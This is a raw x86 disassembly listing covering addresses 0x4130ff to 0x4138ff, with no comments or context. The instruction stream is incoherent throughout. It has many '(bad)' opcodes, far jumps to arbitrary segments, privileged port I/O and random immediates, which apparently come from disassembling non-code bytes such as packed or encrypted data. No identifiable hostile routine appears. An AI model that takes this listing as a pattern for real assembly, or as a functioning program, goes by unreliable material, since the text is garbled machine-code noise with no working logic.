  4130ff:	xlat   BYTE PTR ds:[ebx]
  413100:	push   ds
  413101:	mov    bh,0xc0
  413103:	jo     0x413104
  413105:	das    
  413106:	lods   al,BYTE PTR cs:[esi]
  413108:	cmp    al,0xb4
  41310a:	gs (bad) 
  41310c:	xchg   edi,eax
  41310d:	xor    BYTE PTR ds:[edi+0x2fc9ebf0],ah
  413114:	outs   dx,BYTE PTR ds:[esi]
  413115:	pop    eax
  413116:	sub    BYTE PTR [eax+0x13],bl
  413119:	aad    0xd4
  41311b:	imul   esi,DWORD PTR [esi],0xffffffb9
  41311e:	xchg   ebx,eax
  41311f:	jl     0x41313e
  413121:	xlat   BYTE PTR ds:[ebx]
  413122:	cmp    DWORD PTR [ebx],edi
  413124:	dec    esp
  413125:	xor    ebx,DWORD PTR [ebp-0x4936bd69]
  41312b:	addr16 retf 0xf292
  41312f:	add    al,0x24
  413131:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413132:	or     eax,0xdc212535
  413137:	add    DWORD PTR [esi+ebp*4+0x75],esp
  41313b:	cs repnz gs scas eax,DWORD PTR es:[edi]
  41313f:	xchg   al,cl
  413141:	cdq    
  413142:	mov    al,ds:0xeb46e779
  413147:	mov    BYTE PTR [edx-0x3e],bh
  41314a:	in     al,0x50
  41314c:	pop    ss
  41314d:	sub    al,0x74
  41314f:	sbb    edi,DWORD PTR [eax+edx*4]
  413152:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413153:	fadd   QWORD PTR [eax+0x6]
  413156:	aam    0xad
  413158:	ins    DWORD PTR es:[edi],dx
  413159:	cmp    edx,DWORD PTR [edi]
  41315b:	and    al,0xd2
  41315d:	loopne 0x413162
  41315f:	jne    0x413136
  413161:	mov    ah,0x20
  413163:	mov    ds:0xed3a81d9,eax
  413168:	lods   al,BYTE PTR ds:[esi]
  413169:	data16 xlat BYTE PTR ds:[ebx]
  41316b:	cld    
  41316c:	mov    al,0x63
  41316e:	inc    esi
  41316f:	fbld   TBYTE PTR [edx]
  413171:	enter  0xbe0f,0xf9
  413175:	mov    cl,0xa5
  413177:	into   
  413178:	das    
  413179:	pop    esp
  41317a:	mov    ch,0x95
  41317c:	retf   0xdd2a
  41317f:	inc    ebp
  413180:	cmc    
  413181:	jae    0x4131ff
  413183:	mov    bh,0xec
  413185:	ss jg  0x41310a
  413188:	ret    0xdd32
  41318b:	imul   esi,DWORD PTR [ebp+0x21592e0c],0xea43249c
  413195:	jmp    0xf9d0:0xba04d5c2
  41319c:	and    bl,BYTE PTR [eax-0x1c]
  41319f:	sbb    esi,DWORD PTR [ebp-0x23]
  4131a2:	push   ds
  4131a3:	mov    ds:0x19c08e74,eax
  4131a8:	xor    BYTE PTR [edx+0x485913f7],cl
  4131ae:	in     eax,dx
  4131af:	and    BYTE PTR [ebx+0x4e81e767],ch
  4131b5:	jne    0x413168
  4131b7:	(bad)  
  4131b9:	sbb    BYTE PTR [esi+0x6d],0x60
  4131bd:	fdivrp st(2),st
  4131bf:	or     al,BYTE PTR [edi+0xe02fa35]
  4131c5:	xor    BYTE PTR [edx+0x3eb616be],bh
  4131cb:	mov    dl,0xe
  4131cd:	xor    BYTE PTR [ebx+ebp*8],bl
  4131d0:	inc    ebp
  4131d1:	pushf  
  4131d2:	cs inc esi
  4131d4:	mov    edi,DWORD PTR [ebx+0x5d3e24df]
  4131da:	in     eax,0x78
  4131dc:	ds dec ecx
  4131de:	iret   
  4131df:	jbe    0x41319c
  4131e1:	push   0x9a4c4466
  4131e6:	and    al,dl
  4131e8:	out    0x23,eax
  4131ea:	jle    0x41325d
  4131ec:	loopne 0x413245
  4131ee:	and    eax,0x8aaa8e4c
  4131f3:	clc    
  4131f4:	bound  edi,QWORD PTR [edi+ebx*1-0x4f]
  4131f8:	inc    ebp
  4131f9:	scas   al,BYTE PTR es:[edi]
  4131fa:	mov    bl,0xc9
  4131fc:	arpl   WORD PTR [eax-0x5f],bx
  4131ff:	leave  
  413200:	ret    0x3da4
  413203:	inc    edx
  413204:	sub    eax,0x56f89d0
  413209:	outs   dx,DWORD PTR ds:[esi]
  41320a:	xchg   sp,ax
  41320c:	and    cl,BYTE PTR [ebp-0xf79cb94]
  413212:	ror    BYTE PTR [edi+0x15],0xc7
  413216:	test   DWORD PTR [ebx+0x4ef8cbb7],0x8f3c00d2
  413220:	lock (bad) 
  413222:	pop    ss
  413223:	push   ds
  413224:	mov    cl,0xc
  413226:	int3   
  413227:	pushf  
  413228:	add    bl,dh
  41322a:	adc    ecx,ebp
  41322c:	outs   dx,BYTE PTR ds:[esi]
  41322d:	in     eax,0x45
  41322f:	fs mov dh,0xf9
  413232:	fcmovnb st,st(0)
  413234:	std    
  413235:	loope  0x413255
  413237:	out    dx,al
  413238:	addr16 mov eax,0xd646cc1a
  41323e:	sbb    ecx,ebp
  413240:	mov    dh,0x8d
  413242:	mov    edx,0x63f0f43a
  413247:	imul   esi,esi,0x4b
  41324a:	mov    ebx,0x454052be
  41324f:	xchg   DWORD PTR [edx-0x70978c5a],esi
  413255:	aaa    
  413256:	shl    BYTE PTR [ebp+ebx*2+0x54],cl
  41325a:	pop    ecx
  41325b:	and    dh,bh
  41325d:	leave  
  41325e:	push   cs
  41325f:	sbb    al,BYTE PTR [edx]
  413261:	and    BYTE PTR [esi-0x2b20191c],bl
  413267:	jmp    0x4132cd
  413269:	mov    ecx,0xee220da3
  41326e:	inc    ebp
  41326f:	shr    BYTE PTR [eax],cl
  413271:	mov    ah,0x3a
  413273:	mov    eax,0x8f905af9
  413278:	adc    dh,al
  41327a:	ins    DWORD PTR es:[edi],dx
  41327b:	ins    DWORD PTR es:[edi],dx
  41327c:	icebp  
  41327d:	mov    cl,0x3f
  41327f:	push   esp
  413280:	mov    al,0x19
  413282:	ins    DWORD PTR es:[edi],dx
  413283:	stc    
  413284:	fld    DWORD PTR [esi]
  413286:	aas    
  413287:	mov    ds:0x5300ed6b,al
  41328c:	push   ds
  41328d:	push   edx
  41328e:	pop    eax
  41328f:	cmp    DWORD PTR [edi+0x6d],eax
  413292:	shl    BYTE PTR [eax],0x58
  413295:	add    eax,0x2731f6cf
  41329a:	rcl    DWORD PTR [edx+edi*2],0x6c
  41329e:	popf   
  41329f:	popf   
  4132a0:	adc    DWORD PTR [esi+edi*4+0x51],eax
  4132a4:	xchg   edi,eax
  4132a5:	sub    al,0x6d
  4132a7:	enter  0xbf69,0xd2
  4132ab:	fs dec ebx
  4132ad:	mov    esp,0x93fc804f
  4132b2:	push   esi
  4132b3:	scas   eax,DWORD PTR es:[di]
  4132b5:	retf   
  4132b6:	fnstcw WORD PTR ds:0xafcc5058
  4132bc:	sbb    eax,0xb98cb096
  4132c1:	mov    eax,ds:0xb4dd054e
  4132c6:	pusha  
  4132c7:	(bad)  
  4132c8:	fs pushf 
  4132ca:	and    bl,BYTE PTR [eax]
  4132cc:	mov    WORD PTR [esi+0x68d1d4ac],?
  4132d2:	jne    0x41328e
  4132d4:	dec    ebp
  4132d5:	test   BYTE PTR [edx],bh
  4132d7:	ss cmp eax,0x2b3b1a1
  4132dd:	fldcw  WORD PTR [eax]
  4132df:	add    al,0x84
  4132e1:	test   BYTE PTR [ecx],0xbc
  4132e4:	xchg   esp,eax
  4132e5:	or     ebx,DWORD PTR [edi-0x4]
  4132e8:	push   ebp
  4132e9:	sbb    BYTE PTR [ecx+0x10],dh
  4132ec:	cmp    edi,DWORD PTR [edi-0x7dfb8761]
  4132f2:	mov    cl,0x73
  4132f4:	dec    ecx
  4132f5:	inc    edi
  4132f6:	mov    bl,0x26
  4132f8:	jbe    0x413349
  4132fa:	pop    ss
  4132fb:	popa   
  4132fc:	mov    fs,WORD PTR [ebx+0x6ec9683d]
  413302:	sbb    edi,edx
  413304:	add    eax,0xffa879d9
  413309:	loop   0x413311
  41330b:	adc    BYTE PTR [edi],0xb2
  41330e:	pop    es
  41330f:	inc    esp
  413310:	scas   eax,DWORD PTR es:[edi]
  413311:	adc    bh,bl
  413313:	xor    eax,0xb66e68bc
  413318:	and    eax,0x13c2c9bf
  41331d:	in     al,0x33
  41331f:	cld    
  413320:	pop    di
  413322:	ins    BYTE PTR es:[edi],dx
  413323:	jp     0x4132c7
  413325:	adc    DWORD PTR [edi],edi
  413327:	(bad)  
  413328:	jmp    0x4132af
  41332a:	pop    eax
  41332b:	jg     0x4133a2
  41332d:	dec    BYTE PTR ds:0x777fbbc8
  413333:	dec    eax
  413334:	add    al,BYTE PTR [esi+0x6b]
  413337:	ins    BYTE PTR es:[edi],dx
  413338:	fst    QWORD PTR [eax+0x71]
  41333b:	loopne 0x413363
  41333d:	fistp  WORD PTR [ebp-0x3d668fd7]
  413343:	pop    ds
  413344:	sbb    al,0x50
  413346:	push   0x383ab805
  41334b:	retf   
  41334c:	xchg   ebx,eax
  41334d:	mov    ch,0xb9
  41334f:	lea    edx,[ecx]
  413351:	adc    eax,0xacf1235a
  413356:	jmp    0x64e4f69e
  41335b:	fs mov bh,0xed
  41335e:	mov    ebp,0xe37b9ae9
  413363:	test   bl,0xc0
  413366:	or     eax,0x28561d2d
  41336b:	sahf   
  41336c:	lock sbb BYTE PTR [ecx],bl
  41336f:	loopne 0x413375
  413371:	mov    WORD PTR [ecx+0x6c],?
  413374:	jne    0x4133b6
  413376:	mov    ebp,0x743e56c7
  41337b:	sti    
  41337c:	mov    ebx,0x187534d
  413381:	mov    ch,0x49
  413383:	or     eax,0xaf021822
  413388:	iret   
  413389:	add    al,0xd8
  41338b:	xchg   esi,eax
  41338c:	and    dl,BYTE PTR [ebp-0x1224fa93]
  413392:	jb     0x4133f3
  413394:	pop    esp
  413395:	xchg   esi,eax
  413396:	ret    0xb202
  413399:	mov    cl,0xe5
  41339b:	outs   dx,BYTE PTR ds:[esi]
  41339c:	js     0x413359
  41339e:	pop    esp
  41339f:	inc    ebx
  4133a0:	and    eax,0x6d53a676
  4133a5:	and    al,0x51
  4133a7:	adc    BYTE PTR cs:[ecx+eax*4],cl
  4133ab:	ins    DWORD PTR es:[edi],dx
  4133ac:	xor    ebx,DWORD PTR [ecx-0x667c2880]
  4133b2:	(bad)  
  4133b3:	sub    edi,DWORD PTR [edx+0x37df9bdf]
  4133b9:	(bad)  
  4133ba:	fild   QWORD PTR [edx+0x79]
  4133bd:	push   0x6e
  4133bf:	imul   DWORD PTR [edx+0x1a]
  4133c2:	jo     0x413438
  4133c4:	xchg   ebx,eax
  4133c5:	rol    DWORD PTR [eax-0x70357b3b],0x4f
  4133cc:	xchg   edx,eax
  4133cd:	pop    esi
  4133ce:	cld    
  4133cf:	or     BYTE PTR [ebp+0x1fb1c3b7],dl
  4133d5:	test   eax,0x724bb9
  4133da:	nop
  4133db:	daa    
  4133dc:	outs   dx,DWORD PTR ds:[esi]
  4133dd:	div    esi
  4133df:	ret    
  4133e0:	adc    BYTE PTR [edx+0x1a1d8ef3],bh
  4133e6:	std    
  4133e7:	mov    esi,0x956db9a3
  4133ec:	clc    
  4133ed:	ja     0x4133ac
  4133ef:	cdq    
  4133f0:	jns    0x4133c9
  4133f2:	cmc    
  4133f3:	aaa    
  4133f4:	or     edi,DWORD PTR [ebx+edi*2]
  4133f7:	pop    eax
  4133f8:	inc    eax
  4133f9:	xor    al,0x2a
  4133fb:	push   es
  4133fc:	xor    DWORD PTR [ecx+ebp*8],esi
  4133ff:	dec    ebp
  413400:	pusha  
  413401:	inc    esp
  413402:	push   eax
  413403:	jl     0x41346b
  413405:	(bad)  
  413408:	add    al,0xf0
  41340a:	push   esp
  41340b:	aam    0x7d
  41340d:	inc    edx
  41340e:	xchg   ebx,eax
  41340f:	ret    
  413410:	jge    0x4133fb
  413412:	loope  0x41344b
  413414:	ror    edi,0xfc
  413417:	lods   al,BYTE PTR ds:[esi]
  413418:	push   esi
  413419:	retf   0x846a
  41341c:	push   0x81a68f3b
  413421:	mov    ebp,0x4b6bc9df
  413426:	sti    
  413427:	mov    esp,es
  413429:	test   bl,bl
  41342b:	call   0x8f76:0xe593e08d
  413432:	pop    es
  413433:	out    0xfd,al
  413435:	mov    bl,0xad
  413437:	xor    al,0x52
  413439:	(bad)  
  41343a:	sti    
  41343b:	out    0xef,eax
  41343d:	std    
  41343e:	fcmovu st,st(2)
  413440:	jb     0x41340e
  413442:	sub    BYTE PTR [eax+ecx*1-0x68],ah
  413446:	push   esp
  413447:	iret   
  413448:	retf   
  413449:	add    BYTE PTR [ecx-0x7138ef9a],al
  41344f:	pop    ecx
  413450:	mov    edi,0xc4b38051
  413455:	lods   eax,DWORD PTR ds:[esi]
  413456:	xor    eax,0xef6e2072
  41345b:	push   ecx
  41345c:	(bad)  
  41345d:	push   cs
  41345e:	xor    BYTE PTR [edx+0x6b],al
  413461:	fist   DWORD PTR [ebx]
  413463:	ret    0x2836
  413466:	jmp    0x86cc:0xc222db0e
  41346d:	mov    bh,0xcc
  41346f:	pop    es
  413470:	jne    0x4134ea
  413472:	push   ds
  413473:	hlt    
  413474:	xchg   ecx,eax
  413475:	cli    
  413476:	int    0x4e
  413478:	(bad)  
  413479:	jne    0x4133fd
  41347b:	les    edx,FWORD PTR [edi+0xacdede8]
  413481:	jmp    0xa68a:0x517fd1f2
  413488:	mov    eax,ds:0x5284fd4e
  41348d:	int    0xf4
  41348f:	xchg   ecx,eax
  413490:	mov    ecx,0x970c97c1
  413495:	mov    cl,BYTE PTR [eax-0x4453c2c5]
  41349b:	push   eax
  41349c:	cmp    edx,ebx
  41349e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41349f:	hlt    
  4134a0:	leave  
  4134a1:	and    ebp,DWORD PTR [ebx]
  4134a3:	adc    cl,al
  4134a5:	or     cl,bh
  4134a7:	mov    esp,0x1b665abd
  4134ac:	inc    edi
  4134ad:	cwde   
  4134ae:	jmp    0x6b13:0xe334c79
  4134b5:	mov    cl,0x67
  4134b7:	push   eax
  4134b8:	jl     0x4134d5
  4134ba:	add    eax,0xe50261a1
  4134bf:	lds    edi,FWORD PTR [edi]
  4134c1:	retf   
  4134c2:	inc    ebx
  4134c3:	jl     0x41348a
  4134c5:	push   ds
  4134c6:	inc    esp
  4134c7:	aam    0x93
  4134c9:	and    esi,ebp
  4134cb:	pop    esp
  4134cc:	dec    esi
  4134cd:	dec    edx
  4134ce:	sti    
  4134cf:	jmp    0xe885cf34
  4134d4:	lds    edi,FWORD PTR [esi]
  4134d6:	data16 or al,0xc2
  4134d9:	jle    0x413556
  4134db:	cmp    ah,0xb8
  4134de:	(bad)  
  4134df:	call   0x3cc4:0x390e70e0
  4134e6:	or     bl,dh
  4134e8:	cmp    eax,0x316d85d6
  4134ed:	into   
  4134ee:	pop    es
  4134ef:	add    DWORD PTR [ebx-0x3f15d436],0x8c4bd035
  4134f9:	fldenv [ebx]
  4134fb:	je     0x413556
  4134fd:	(bad)  
  4134fe:	imul   bl
  413500:	push   0xffffffd5
  413502:	xchg   ebx,eax
  413503:	retf   0x77ec
  413506:	mov    al,0x55
  413508:	inc    esp
  413509:	rcl    BYTE PTR [ecx],1
  41350b:	xchg   ebx,eax
  41350c:	fs popa 
  41350e:	(bad)  
  41350f:	hlt    
  413510:	mov    ?,eax
  413512:	stc    
  413513:	cli    
  413514:	call   DWORD PTR ds:0x4efe207c
  41351a:	pushf  
  41351b:	xor    ebp,0xf6ff8c3d
  413521:	inc    eax
  413522:	push   0x6a993025
  413527:	mov    al,ds:0x18ce24d9
  41352c:	mov    dl,0xaa
  41352e:	and    eax,0x6884c331
  413533:	mov    ecx,DWORD PTR [ecx+0x66b01ec]
  413539:	mov    eax,DWORD PTR [eax+0x56]
  41353c:	xlat   BYTE PTR ds:[ebx]
  41353d:	jae    0x41353b
  41353f:	popf   
  413540:	sahf   
  413541:	dec    edi
  413542:	add    BYTE PTR [edx],ch
  413544:	sub    BYTE PTR [eax],0xa3
  413547:	cmp    DWORD PTR ds:0x8cb884e8,edx
  41354d:	into   
  41354e:	mov    bh,0x9a
  413550:	sar    DWORD PTR [eax],1
  413552:	lock push esi
  413554:	out    dx,al
  413555:	imul   ebp,DWORD PTR [ebp-0x46],0x19
  413559:	jle    0x413551
  41355b:	fcmovbe st,st(4)
  41355d:	mov    edx,0x4ca0264d
  413562:	jg     0x4135be
  413564:	pop    ss
  413565:	lods   eax,DWORD PTR ds:[esi]
  413566:	sbb    ebx,edi
  413568:	repz ficomp WORD PTR ds:0x3f6df78c
  41356f:	test   BYTE PTR [ebp+0x5e],0x34
  413573:	jmp    0x4135c5
  413575:	push   0x449ed195
  41357a:	imul   esp,DWORD PTR [eax+0x4f],0xffffff9e
  41357e:	jge    0x413596
  413580:	sub    esp,esi
  413582:	test   BYTE PTR [edi],ah
  413584:	pop    ebp
  413585:	jmp    0x996e:0x9a86e67e
  41358c:	aam    0xc
  41358e:	add    edx,eax
  413590:	cld    
  413591:	add    eax,0x3c8924e1
  413596:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413597:	push   ebp
  413598:	inc    edi
  413599:	jl     0x41358e
  41359b:	dec    ebp
  41359c:	cmp    al,0x49
  41359e:	or     BYTE PTR ds:0x2dc742f0,0xcd
  4135a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4135a6:	mov    BYTE PTR [eax],bh
  4135a8:	imul   edx,DWORD PTR [esi],0xffffffa3
  4135ab:	js     0x41358b
  4135ad:	call   0xf2c1cb43
  4135b2:	jge    0x413565
  4135b4:	jle    0x413632
  4135b6:	push   edx
  4135b7:	rcl    DWORD PTR [eax-0x4d],0x44
  4135bb:	sahf   
  4135bc:	out    0xe9,al
  4135be:	shr    BYTE PTR [esi+0x61100325],0xfe
  4135c5:	test   DWORD PTR ds:0x829c7e04,edx
  4135cb:	std    
  4135cc:	repnz enter 0xa994,0xb8
  4135d1:	ret    
  4135d2:	xchg   esp,eax
  4135d3:	sahf   
  4135d4:	ins    DWORD PTR es:[edi],dx
  4135d5:	ss daa 
  4135d7:	scas   eax,DWORD PTR es:[edi]
  4135d8:	data16 mul BYTE PTR [edi-0x3f9ef354]
  4135df:	sbb    al,0x21
  4135e1:	aaa    
  4135e2:	push   0xffffff87
  4135e4:	addr16 retf 
  4135e6:	arpl   sp,bx
  4135e8:	xchg   ebp,eax
  4135e9:	ret    
  4135ea:	ds push eax
  4135ec:	jp     0x4135ec
  4135ee:	dec    ecx
  4135ef:	repnz inc ecx
  4135f1:	jnp    0x4135cd
  4135f3:	jb     0x4135fd
  4135f5:	loopne 0x4135b4
  4135f7:	push   0xffffffce
  4135f9:	mov    bh,0x9f
  4135fb:	je     0x41361d
  4135fd:	test   eax,0xd69e3607
  413602:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413603:	int    0xb6
  413605:	lds    edx,FWORD PTR [edi+0xf]
  413608:	mov    ecx,esp
  41360a:	jo     0x41366e
  41360c:	aaa    
  41360d:	xchg   edx,eax
  41360e:	std    
  41360f:	sub    eax,0xa5630c6c
  413614:	ds jmp 0xeb2:0x852edf46
  41361c:	cdq    
  41361d:	or     al,0xba
  41361f:	xor    ch,0x78
  413622:	popa   
  413623:	and    eax,0x3b068594
  413628:	dec    esp
  413629:	je     0x413601
  41362b:	in     al,dx
  41362c:	in     al,dx
  41362d:	sub    al,BYTE PTR [ebx+0x7c]
  413630:	gs add eax,0x9c98f011
  413636:	aaa    
  413637:	(bad)  
  413638:	stos   BYTE PTR es:[edi],al
  413639:	pop    eax
  41363a:	ins    DWORD PTR es:[edi],dx
  41363b:	mov    bl,0xbf
  41363d:	inc    esp
  41363e:	or     edi,DWORD PTR [ebp+0xb869650]
  413644:	or     al,ch
  413646:	jp     0x413603
  413648:	mov    eax,ds:0x249f5992
  41364d:	retf   
  41364e:	jl     0x413620
  413650:	(bad)  
  413651:	mov    BYTE PTR [ebx+esi*2+0x56da702a],bl
  413658:	ins    DWORD PTR es:[edi],dx
  413659:	dec    esp
  41365a:	sbb    ecx,DWORD PTR [esi+0x39]
  41365d:	jle    0x41369a
  41365f:	in     al,0x4e
  413661:	in     eax,dx
  413662:	mov    ds:0x54b32927,al
  413667:	or     DWORD PTR [eax+0x13f3ff90],ebx
  41366d:	pop    eax
  41366e:	mov    cs,WORD PTR [esp+ebx*2-0x67]
  413672:	jno    0x41362d
  413674:	adc    eax,0x73d1abef
  413679:	add    dl,bh
  41367b:	xchg   DWORD PTR [ecx],eax
  41367d:	adc    esi,DWORD PTR [edi+ebx*8+0x4b0cc543]
  413684:	pop    ss
  413685:	ret    
  413686:	les    ecx,FWORD PTR [esi]
  413688:	mov    ah,0x18
  41368a:	idiv   DWORD PTR [ebx]
  41368c:	mov    DWORD PTR [ebx-0x5307f948],ebp
  413692:	fmul   QWORD PTR [ecx+0x5c621fd3]
  413698:	fild   WORD PTR [ebx+0x3b5b87e0]
  41369e:	xor    edx,ebp
  4136a0:	xor    DWORD PTR [edi],0xe053b7a
  4136a6:	push   ss
  4136a7:	std    
  4136a8:	pop    ecx
  4136a9:	and    edi,DWORD PTR [eax-0x5a]
  4136ac:	xchg   esi,eax
  4136ad:	mov    BYTE PTR [esi],ah
  4136af:	jl     0x4136e9
  4136b1:	aad    0xc3
  4136b3:	fiadd  WORD PTR [ebx-0x5be63d4a]
  4136b9:	mov    eax,ebp
  4136bb:	fwait
  4136bc:	popa   
  4136bd:	(bad)  
  4136bf:	test   BYTE PTR [edi-0x5a1c9ff7],0x18
  4136c6:	pusha  
  4136c7:	mov    WORD PTR [edx-0x8f18ae],es
  4136cd:	sti    
  4136ce:	(bad)  
  4136cf:	and    ecx,DWORD PTR ds:0x1c132ec3
  4136d5:	data16 shl BYTE PTR [edi*8+0xf90b4f4],0x24
  4136de:	xchg   ebx,eax
  4136df:	mov    ebp,DWORD PTR [edx+0x23]
  4136e2:	sar    DWORD PTR [edi+0x6ef680d1],1
  4136e8:	pop    ds
  4136e9:	and    dh,ch
  4136eb:	jecxz  0x413765
  4136ed:	inc    ecx
  4136ee:	dec    edx
  4136ef:	fbld   TBYTE PTR [eax+eiz*1]
  4136f2:	ja     0x4136b5
  4136f4:	dec    esi
  4136f5:	push   es
  4136f6:	outs   dx,BYTE PTR ds:[esi]
  4136f7:	sahf   
  4136f8:	data16 jns 0x413684
  4136fb:	xor    DWORD PTR [edx+ebx*1-0x72],esp
  4136ff:	aas    
  413700:	inc    ebx
  413701:	push   ebx
  413702:	xor    edx,eax
  413704:	sub    al,0x91
  413706:	cmp    ah,BYTE PTR [eax-0x30]
  413709:	ja     0x41374d
  41370b:	pop    ebp
  41370c:	jmp    0x4136a0
  41370e:	mov    ah,0xa1
  413710:	leave  
  413711:	popa   
  413712:	jg     0x413703
  413714:	push   ss
  413715:	cmp    BYTE PTR [edx+0x48],al
  413718:	int    0x8b
  41371a:	and    edi,esi
  41371c:	cdq    
  41371d:	jb     0x41377f
  41371f:	jecxz  0x413735
  413721:	xchg   esi,eax
  413722:	cdq    
  413723:	out    0xf8,eax
  413725:	loope  0x413717
  413727:	imul   esi,DWORD PTR [ecx+0x7c],0xc
  41372b:	and    al,0x46
  41372d:	fadd   DWORD PTR [edi-0x15702484]
  413733:	or     ah,al
  413735:	pop    ebx
  413736:	xchg   edx,eax
  413737:	or     edx,DWORD PTR [edi+0xa]
  41373a:	out    dx,eax
  41373b:	loopne 0x4136e3
  41373d:	inc    ecx
  41373e:	add    esi,0xffffffed
  413741:	icebp  
  413742:	add    BYTE PTR ds:[ecx+0x1df45dc6],0xb1
  41374a:	add    eax,0xc26882af
  41374f:	jge    0x413747
  413751:	xchg   DWORD PTR [edx],eax
  413753:	xchg   BYTE PTR [esi],bl
  413755:	and    eax,0x956674a3
  41375a:	xor    dl,ah
  41375c:	adc    al,0xc4
  41375e:	jmp    0xa54b4b04
  413763:	or     al,0x51
  413765:	mov    ch,0x96
  413767:	jmp    0xe76fb298
  41376c:	call   0x90bf7fd3
  413771:	outs   dx,DWORD PTR ds:[esi]
  413772:	dec    ebp
  413773:	fadd   DWORD PTR [edx-0xea47c75]
  413779:	and    BYTE PTR [ecx+0x14f27bac],cl
  41377f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413780:	(bad)  
  413782:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413783:	adc    ah,BYTE PTR [ebx-0x13]
  413786:	out    dx,eax
  413787:	stos   DWORD PTR es:[edi],eax
  413788:	leave  
  413789:	pop    edi
  41378a:	sbb    DWORD PTR [ebx-0x5a06ce6c],ecx
  413790:	xchg   DWORD PTR [edi+0x2c],ebp
  413793:	mov    ebx,0x22aaf104
  413798:	pop    esp
  413799:	das    
  41379a:	outs   dx,BYTE PTR ds:[esi]
  41379b:	fucomip st,st(1)
  41379d:	lds    esp,FWORD PTR [ebp+0x31]
  4137a0:	push   ds
  4137a1:	pusha  
  4137a2:	xchg   BYTE PTR [ecx-0x6a8bfa42],cl
  4137a8:	push   ds
  4137a9:	scas   al,BYTE PTR es:[edi]
  4137aa:	mov    al,0xe0
  4137ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4137ad:	pop    edx
  4137ae:	pop    ss
  4137af:	fcom   st(7)
  4137b1:	jmp    0x3d74b0c3
  4137b6:	inc    edx
  4137b7:	pop    ecx
  4137b8:	retf   0x4d3b
  4137bb:	inc    esp
  4137bc:	push   edx
  4137bd:	pushf  
  4137be:	cmp    ebp,DWORD PTR [edi-0x17]
  4137c1:	sub    ebx,DWORD PTR [ebx+0x2f87eb44]
  4137c7:	or     DWORD PTR [esp+eiz*8],ebx
  4137ca:	pushf  
  4137cb:	or     BYTE PTR [ecx],dl
  4137cd:	call   0x3faf34ff
  4137d2:	adc    al,0x40
  4137d4:	sub    eax,0xbddeb7bf
  4137d9:	and    eax,0x1771905a
  4137de:	pop    DWORD PTR [ebp+0x3b]
  4137e1:	clc    
  4137e2:	imul   edi,DWORD PTR [edx+ebx*1-0x51c855ca],0xed3e41ce
  4137ed:	jge    0x41377e
  4137ef:	or     DWORD PTR [esi+0x6c4e4869],ebx
  4137f5:	outs   dx,DWORD PTR ds:[esi]
  4137f6:	das    
  4137f7:	xor    DWORD PTR [edx+0x12bae464],edi
  4137fd:	imul   edx,DWORD PTR ds:[edi],0xa9e16af4
  413804:	pop    edi
  413805:	add    eax,0xd187ee54
  41380a:	fisub  WORD PTR [ebp-0x1c]
  41380d:	out    dx,al
  41380e:	enter  0x535e,0x48
  413812:	je     0x413815
  413814:	pusha  
  413815:	fnsave [ebp+0x40b8f7b3]
  41381b:	jne    0x4137de
  41381d:	repz add ebx,edi
  413820:	push   es
  413821:	fwait
  413822:	mov    dl,0x98
  413824:	(bad)  
  413826:	cmp    eax,0x45354adc
  41382b:	lods   al,BYTE PTR ds:[esi]
  41382c:	sbb    ah,dh
  41382e:	jle    0x413853
  413830:	out    dx,al
  413831:	inc    esi
  413832:	jo     0x4137e1
  413834:	xor    BYTE PTR [eax+0x14],al
  413837:	loopne 0x413828
  413839:	mov    esp,0x3e34477a
  41383e:	push   eax
  41383f:	ret    
  413840:	fsubrp st(3),st
  413842:	inc    ebp
  413843:	scas   eax,DWORD PTR es:[edi]
  413844:	cmp    BYTE PTR [ebx],cl
  413846:	mov    ch,0x60
  413848:	arpl   bx,sp
  41384a:	js     0x413843
  41384c:	loopne 0x413866
  41384e:	adc    DWORD PTR [eax+0x67],esi
  413851:	jmp    0x9e7b4e59
  413856:	je     0x4137de
  413858:	aas    
  413859:	lods   al,BYTE PTR ds:[esi]
  41385a:	xor    DWORD PTR [ebx+edi*4+0xb],0xffffffd0
  41385f:	cld    
  413860:	call   0x18eebe22
  413865:	imul   ebx,DWORD PTR [edi+0x1e82bb],0xd
  41386c:	cld    
  41386d:	adc    ecx,DWORD PTR [ebx+0x23646232]
  413873:	push   ecx
  413874:	pop    ecx
  413875:	outs   dx,DWORD PTR ds:[esi]
  413876:	mov    eax,0xe89d8440
  41387b:	mov    esp,0xaf123c6e
  413880:	aam    0xdf
  413882:	inc    edx
  413883:	push   edx
  413884:	mov    edi,0xda879229
  413889:	in     al,dx
  41388a:	or     ecx,DWORD PTR [ebx+0x61]
  41388d:	cmp    eax,0x53ffcb21
  413892:	arpl   ax,si
  413894:	loop   0x41385d
  413896:	push   edi
  413897:	and    dh,BYTE PTR [esi+ebx*8]
  41389a:	rep ins BYTE PTR es:[edi],dx
  41389c:	cdq    
  41389d:	sub    eax,0xa6ab80e4
  4138a2:	sbb    ebx,DWORD PTR [ebx+0x19f00142]
  4138a8:	or     BYTE PTR [ebp+0xd],ch
  4138ab:	test   esp,ebp
  4138ad:	shl    DWORD PTR [edx-0x29432bcf],1
  4138b3:	sub    BYTE PTR [eax],0x51
  4138b6:	std    
  4138b7:	es sub al,bl
  4138ba:	jmp    0x4138ae
  4138bc:	mov    ecx,0xfaffb86b
  4138c1:	sub    edi,DWORD PTR [ecx]
  4138c3:	call   0xcfccf267
  4138c8:	pushf  
  4138c9:	retf   
  4138ca:	cmp    al,0x3c
  4138cc:	dec    eax
  4138cd:	div    BYTE PTR [edx+0x44]
  4138d0:	adc    eax,0x63b46032
  4138d5:	dec    ebp
  4138d6:	fisttp DWORD PTR [esi]
  4138d8:	push   cs
  4138d9:	aaa    
  4138da:	pop    edx
  4138db:	push   0xb39eb603
  4138e0:	push   es
  4138e1:	xchg   ecx,eax
  4138e2:	adc    ah,al
  4138e4:	mov    bh,0xac
  4138e6:	and    ch,BYTE PTR [ebx+0x102be067]
  4138ec:	ja     0x4138b0
  4138ee:	lahf   
  4138ef:	mov    dl,0x94
  4138f1:	mov    edi,0x2df870a6
  4138f6:	test   eax,0x7eada371
  4138fb:	mov    cl,BYTE PTR [ecx-0x5d]
  4138fe:	hlt    
  4138ff:	adc    bh,BYTE PTR [ebp+0x140c0578]
